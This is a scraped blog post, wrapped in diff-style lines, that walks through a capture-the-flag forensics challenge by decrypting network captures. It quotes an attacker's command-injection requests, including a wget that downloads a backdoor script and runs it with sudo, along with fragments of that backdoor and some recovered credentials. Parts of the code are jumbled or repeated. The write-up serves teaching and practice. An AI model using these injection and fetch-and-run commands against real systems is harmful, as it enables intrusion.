@@ -1,0 +1,150 @@
+7127-bin,1,<link rel='stylesheet' id='highlander-comments-ie7-css'  href='https://s2.wp.com/wp-content/mu-plugins/highlander-comments/style-ie7.css?m=1351637563h&#038;ver=20110606' media='all' />
+7127-bin,2,Skip to content
+7127-bin,3,Because life is not only playing wow and live at your parents house on your 30's
+7127-bin,4,ASIS finals 2016
+7127-bin,5,[Crypto]  SRPP (Secure Remote Password Protocol)
+7127-bin,6,Abuse Mail (300) – 62 solves
+7127-bin,7,Our abuse desk received an mail that someone from our network has hacked their company
+7127-bin,8,"With their help we found some suspected traffic in our network logs, but we can't find what exactly has happened"
+7127-bin,9,Can you help us to catch the culprit?
+7127-bin,10,"we have 3 capture files abuse00.pcap, abuse01.pcap and abuse02.pcap"
+7127-bin,11,Starting with abuse00.pcap we can see we have some encrypted ESP packages and some telenet communication
+7127-bin,12,Let's check telenet's packages:
+7127-bin,13,Now we have the credentials to decrypt the ESP packages! using wireshark to decrypt them Edit -> Preferences -> Protocols -> ESP
+7127-bin,14,After decrypting it we can see that the hacker used a remote command vulnerability at the GET parameter IP to  upload a backdoor on the server
+7127-bin,15,the commands he used:
+7127-bin,16,GET /?ip=google.com HTTP/1.1
+7127-bin,17,GET /?ip=google.com;ls HTTP/1.1
+7127-bin,18,"4 packets transmitted, 4 received, 0% packet loss, time 3005ms"
+7127-bin,19,GET /?ip=;ls%20-la HTTP/1.1
+7127-bin,20,GET /?ip=;sudo%20-l HTTP/1.1
+7127-bin,21,Matching Defaults entries for www-data on router:
+7127-bin,22,User www-data may run the following commands on router:
+7127-bin,23,GET /?ip=;id HTTP/1.1
+7127-bin,24,GET /?ip=;wget http://10.5.5.207/backdoor.py -O /tmp/backdoor.py HTTP/1.1
+7127-bin,25,Connecting to 10.5.5.207:80..
+7127-bin,26,connected.
+7127-bin,27,"HTTP request sent, awaiting response.."
+7127-bin,28,Saving to: '/tmp/backdoor.py'
+7127-bin,29,2017-07-26 09:43:36 (458 MB/s) - '/tmp/backdoor.py' saved [2428/2428]
+7127-bin,30,GET /?ip=;cat /tmp/backdoor.py HTTP/1.1
+7127-bin,31,"ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)"
+7127-bin,32,yield L[i:i+n]
+7127-bin,33,try:
+7127-bin,34,"#print ""[+] Sending file {}"".format(data[1])"
+7127-bin,35,pass
+7127-bin,36,GET /?ip=;nohup sudo python /tmp/backdoor.py K8djhaIU8H2d1jNb & HTTP/1.1
+7127-bin,37,The hacker used AES to encrypt his commands! And we know the password he used! which we can get it from the GET HTTP request! which was K8djhaIU8H2d1jNb 'GET /?ip=;nohup sudo python /tmp/backdoor.py K8djhaIU8H2d1jNb & HTTP/1.1'.
+7127-bin,38,"ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)"
+7127-bin,39,yield L[i:i+n]
+7127-bin,40,try:
+7127-bin,41,"#print ""[+] Sending file {}"".format(data[1])"
+7127-bin,42,pass
+7127-bin,43,"With all this information we need to decrypt the packages from the other PCAPs, which contains the communication between the hacker and the server, we can use the hackers script and password! first lets extract the encrypted data with tshark!"
+7127-bin,44,kinyabitch@Debian ~/D/H/c/sha2017> tshark -r abuse02.pcap -Tfields -e data | xxd -r -p > encrypted1
+7127-bin,45,kinyabitch@Debian ~/D/H/c/sha2017> tshark -r abuse03.pcap -Tfields -e data | xxd -r -p > encrypted2
+7127-bin,46,Now modifing the scrypt so we can decrypt our IMCP encrypted data:
+7127-bin,47,"ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)"
+7127-bin,48,yield L[i:i+n]
+7127-bin,49,#     try:
+7127-bin,50,"#                         #print ""[+] Sending file {}"".format(data[1])"
+7127-bin,51,# if outp not in lis:
+7127-bin,52,print outp
+7127-bin,53,Running the script:
+7127-bin,54,kinyabitch@Debian ~/D/H/c/sha2017> python back.py
+7127-bin,55,drwx------  2 root root 4096 Jul 27 07:27 .ssh
+7127-bin,56,# The following lines are desirable for IPv6 capable hosts
+7127-bin,57,Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT
+7127-bin,58,Host is up (0.00010s latency).
+7127-bin,59,Not shown: 997 closed ports
+7127-bin,60,MAC Address: 00:0C:29:3D:FD:B0 (VMware)
+7127-bin,61,Nmap done: 1 IP address (1 host up) scanned in 1.52 seconds
+7127-bin,62,Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT
+7127-bin,63,Host is up (0.00010s latency).
+7127-bin,64,Not shown: 997 closed ports
+7127-bin,65,MAC Address: 00:0C:29:3D:FD:B0 (VMware)
+7127-bin,66,Nmap done: 1 IP address (1 host up) scanned in 1.52 seconds
+7127-bin,67,Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT
+7127-bin,68,Host is up (0.00010s latency).
+7127-bin,69,Not shown: 997 closed ports
+7127-bin,70,MAC Address: 00:0C:29:3D:FD:B0 (VMware)
+7127-bin,71,Nmap done: 1 IP address (1 host up) scanned in 1.52 seconds
+7127-bin,72,Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT
+7127-bin,73,Host is up (0.00010s latency).
+7127-bin,74,Not shown: 997 closed ports
+7127-bin,75,MAC Address: 00:0C:29:3D:FD:B0 (VMware)
+7127-bin,76,Nmap done: 1 IP address (1 host up) scanned in 1.52 seconds
+7127-bin,77,command:  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+7127-bin,78,Dload  Upload   Total   Spent    Left  Speed
+7127-bin,79,<p>This server could not verify that you
+7127-bin,80,are authorized to access the document
+7127-bin,81,requested
+7127-bin,82,Either you supplied the wrong
+7127-bin,83,browser doesn't understand how to supply
+7127-bin,84,"3.any (Pseudo-device that captures on all interfaces) [Up, Running]"
+7127-bin,85,"As we can see we can extract alot of usefull Information from here, we now have the RSA private key used for TLS encryption and the certificate from the companies intranet website, the last 2 commands we could see that the hacker actually started two tcpdumps initiating the captures and one of them is a USB capture! maybe this will be useful latter!"
+7127-bin,86,Usefull data extracted:
+7127-bin,87,—–END PRIVATE KEY—–
+7127-bin,88,Now doing the same thing for the 2nd PCAP capture by adding this to the previous backdoor.py script:
+7127-bin,89,print outp
+7127-bin,90,kinyabitch@Debian ~/D/H/c/sha2017> python back.py
+7127-bin,91,getfile:22:xMWknTPeWuv2HY5z-Tp3Th8wX049inFKvUYvyQhSnuWRsJ8XzXXMYRfYezTcfq9rVFulD0i2Etj8CN3CMylyEVucEymaXhAHKJeR134iXZXUGgFFEzT8tBp8TTPF9cH0webjPbT3NYAxdcM1Wosa6PQD4Cun6osJb5WXuXQ0hZQLKOEx3s_cDoIR2hQmLNbb7lslfPvGEB79Ti_j-CahSlhI8Dbw5ON4yMeCqMMsuPc45ZAAZ8AXWi_CKGLgOvRGJHjMt7ML7MuskilBFw3g0n6vg2nugnqLNLftwWZh8CTvwiRNjNgEATCsNg1RNELnu3n_CXb_Djwlzbsei9zXQPQKPnmdHwucaHNRX51Z5gGEaIxXcjqRyNAGYHVqsTy4BbM32F_-dd1LSKOorBBGoXQLWfKGYHeb1m271eBchjv-JWWFpzK-yHztsmZn2At3i4T_vbuW72zUj3BvoerDO-srr6RKI-4UGrwzbEpjW5PNXq2FmYeKHt5hXT4EhBTgQOXxCvjtS_LIGkPWX1S36x2xBj87JdsRpo6UqrYWrDkDVycbksITiqo7EjNu-bvmHGbxO20cSUxMqHSgbA6PmkYdKPtR_AyjZreMEIMnnw_CmD0svSTpN4NrmLe-g4qUwYj4BENz_dSmLyvN7IYnoCcVwEACDyDBjv-Yg2PY6NUBARI68jWLdmHePchpYWXS3ZKdrt1eycVErN6YhJquGOVpfY9S4_1GenYWRY8in2MeK1105Y2eBKmxWIvZ8f8iW8EGsqAIeAZ0MmJUphs4Ibp-54z1dyRU
+7127-bin,92,getfile:13:GA1QBh84hcfGb0cIr9PNPIVMe6FUmD-x98FH5mTW_8LsuTXYhYixTcRrJXFHr1D7NuQynU669tClrXvJsQO-14bI-5v0gG8rlpuDR2L2TdfeyFhxcoPgLKuFBTAGTZkt-6I4hBZaOY3hdFmITNTH-ch29k2E8SY5M9F-KU17oyQ8Kv2J9qbceSWRyCO0dVhJq2oOVvoJzhe2bWwQSHhlPEXy20onc7fz7E58Jw-rftZqGAuQWpcnobRrFlDPLXE2UI3pU2TXi0Wzg8teEOLpb7TDA87tA6EgOqV0tSCL0C8qEI8Fv6nEBiSI1zXGfzzmY3lO6P3kNZnOV6VXTF521So8XreKqd2vNYrgNpr-IljhTLZ0HMmHn6nHlvPWfJC-MswWe41ztWWQ0-LuhvMO8MR4Yl9bpEKwJ5pF0igdOPc0hY5Finn8rTSgAGuhJYFDniX79dhdam6Mi17TAVzw1Rhnp9qGHpXpRArXk_hg5dGNSfmJe4AktaOFqHeOmpa15QLc5wZm7RTvsXYN7-EhAHWDPg7ighLZipwy54nIQcztZM4mXzRAqoIWSJb-G5IxgVRZxhAs_4db4cG4c_pNHNxNh7m3romVsiPm9zmkU2Em0Qf_suCCDsGZSN1xFUJKBtn-W0bzyGqF2dNvWuG2UKT2mTbZ3jnEEcyRp-vyfsXDaKaSNxH1dvEo8_H7L3nOsi_jkB6YwKr0_dgcSclcOx_vYkvqRq9qrL5UMsE_s2ZnjTXC46CFLJecVfRBElmjOevT4MnC4GadhYJhwaEWUEuBh8Yvh4B1
+7127-bin,93,...Truncated...
+7127-bin,94,"We have alot of lines, the first line of the output gives us an hint of what are all those lines and we can see 'getfile:/tmp/intranet.pcap' so if we extract all those strings after getfile:0:%s to the getfile:301:%s that string is enconded with base64 so we just needed to join them all and decode it since tshark is duplicating our data we actually had to extract 4 of them, but in reality it's actually only two the intranet.pcap and the usb.cap (and yes! remember the IMCP decrypted packages? the hacker actually started 2 tcpdump commands!)."
+7127-bin,95,Our final python script will be:
+7127-bin,96,"ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)"
+7127-bin,97,yield L[i:i+n]
+7127-bin,98,#     try:
+7127-bin,99,"#                         #print ""[+] Sending file {}"".format(data[1])"
+7127-bin,100,# if outp not in lis:
+7127-bin,101,try:
+7127-bin,102,"Now checking intranet.pcap we could see that we have more encrypted data but in this case was TLS, and then we remembered after we decrypted abuse2.cap we got our RSA.keys to decrypt these packages! so once again using wireshark to decrypt:"
+7127-bin,103,kinyabitch@Debian ~/D/H/c/sha2017> mv lol1.pcap intranet.pcap
+7127-bin,104,kinyabitch@Debian ~/D/H/c/sha2017> wireshark intranet.pcap
+7127-bin,105,Now seeing HTTP packages we can see that the hacker downloaded file secret.zip!
+7127-bin,106,The zip file is protected by a password! now we either bruteforce the zip file (which was a very hard way to do it since the password was 'somehow' complicated) or we needed to find it in our USB capture! which is a USB keyboard capture!
+7127-bin,107,kinyabitch@Debian ~/D/H/c/sha2017> mv lol4.pcap usb.pcap
+7127-bin,108,kinyabitch@Debian ~/D/H/c/sha2017> wireshark usb.pcap
+7127-bin,109,Extract the keys pressed from the usb.cap:
+7127-bin,110,"kinyabitch@Debian ~/D/H/c/sha2017> tshark -r usb.pcap -Y ""frame.len==72"" -Tfields -e usb.capdata > usb.txt"
+7127-bin,111,And now getting the table to decode the keys from http://www.usb.org/developers/hidpage/Hut1_12v2.pdf
+7127-bin,112,Writting the script:
+7127-bin,113,"shift = ""02:00:00:00:00:00:00:00"""
+7127-bin,114,"ignore = ""00:00:00:00:00:00:00:00"""
+7127-bin,115,"'0b': 'h',"
+7127-bin,116,if key.strip() == shift or key.strip() == ignore or key.strip() == ignore2:
+7127-bin,117,continue
+7127-bin,118,"#print key == ignore, key == '02:00:00:00:00:00:00:00', key"
+7127-bin,119,if k[0] == '02': #shift pressed
+7127-bin,120,kinyabitch@Debian ~/D/H/c/sha2017> python usb.py
+7127-bin,121,curl -ks https://root:Welcome123@intranet/secret.zip
+7127-bin,122,unzip secret.zip
+7127-bin,123,The password is Pyj4m4P4rtY@2017 for the zip file!
+7127-bin,124,kinyabitch@Debian ~/D/H/c/sha2017> unzip secret.zip
+7127-bin,125,inflating: secret.txt
+7127-bin,126,inflating: hamburger_pussy.jpg
+7127-bin,127,kinyabitch@Debian ~/D/H/c/sha2017> cat secret.txt
+7127-bin,128,Finally the flag was flag{bf107b7f64f320034df7e48669439f69}
+7127-bin,129,Share this:TwitterFacebookLike this:Like Loading...
+7127-bin,130,Related
+7127-bin,131,Leave a Reply Cancel reply
+7127-bin,132,Enter your comment here...
+7127-bin,133,Fill in your details below or click an icon to log in:
+7127-bin,134,Email (required) (Address never made public)
+7127-bin,135,Name (required)
+7127-bin,136,You are commenting using your WordPress.com account.
+7127-bin,137,You are commenting using your Google account.
+7127-bin,138,You are commenting using your Twitter account.
+7127-bin,139,You are commenting using your Facebook account.
+7127-bin,140,Cancel
+7127-bin,141,Connecting to %s
+7127-bin,142,Notify me of new comments via email
+7127-bin,143,Notify me of new posts via email.
+7127-bin,144,#respond
+7127-bin,145,Search for:
+7127-bin,146,ASIS finals 2016
+7127-bin,147,[Crypto]  SRPP (Secure Remote Password Protocol)
+7127-bin,148,Privacy & Cookies: This site uses cookies
+7127-bin,149,"By continuing to use this website, you agree to their use."
+7127-bin,150,"To find out more, including how to control cookies, see here:"
